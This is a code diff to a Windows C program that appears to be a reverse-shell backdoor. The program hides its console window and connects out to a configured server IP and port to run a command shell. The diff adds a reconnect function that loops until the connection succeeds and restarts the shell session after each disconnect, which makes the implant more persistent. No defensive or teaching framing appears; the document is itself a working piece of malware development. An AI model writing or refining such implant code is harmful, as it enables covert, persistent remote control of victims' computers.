@@ -33,6 +33,9 @@
 int sock;
 struct sockaddr_in ServAddr;
 
+void Cmd();
+
+//============ Check & Close Socket on Server Disconnect ============//
 boolean connected(SOCKET sock){
      char buf;
      int err = recv(sock, &buf, 1, MSG_PEEK);
@@ -43,6 +46,20 @@ boolean connected(SOCKET sock){
         }
      }
      return TRUE;
+}
+
+//============ Reconnect to Server ============//
+void reconnect() {
+    // AF_INET represents connection over IPv4 
+    // SOCK_STREAM defines TCP connection
+    // definition: WINSOCK_API_LINKAGE SOCKET WSAAPI socket(int af, int type, int protocol);
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+
+    while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
+		Sleep(30);
+	}
+
+    Cmd();
 }
 
 //============ Shell ============//
@@ -80,6 +97,8 @@ void Cmd() {
             fclose(fd);
 		}
     }
+
+    reconnect();
 }
 
 //============ Main ============//
@@ -89,7 +108,6 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
     AllocConsole();
     stealth = FindWindow("ConsoleWindowClass", NULL);
     ShowWindow(stealth, 0);
-
     
     // setup socket for connection
     unsigned short ServPort;
@@ -110,22 +128,11 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 		exit(1);
 	}
 
-    // AF_INET represents connection over IPv4 
-    // SOCK_STREAM defines TCP connection
-    // definition: WINSOCK_API_LINKAGE SOCKET WSAAPI socket(int af, int type, int protocol);
-    sock = socket(AF_INET, SOCK_STREAM, 0);
-
     memset(&ServAddr, 0, sizeof(ServAddr));
     // define params for ServAddr variable
     ServAddr.sin_family = AF_INET;
 	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
 	ServAddr.sin_port = htons(ServPort);
     
-    reconnect:
-    // attempt to connect to server in evry 30 seconds until it is successful 
-	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
-		Sleep(30);
-	}
-
-    Cmd();
+    reconnect();
 }
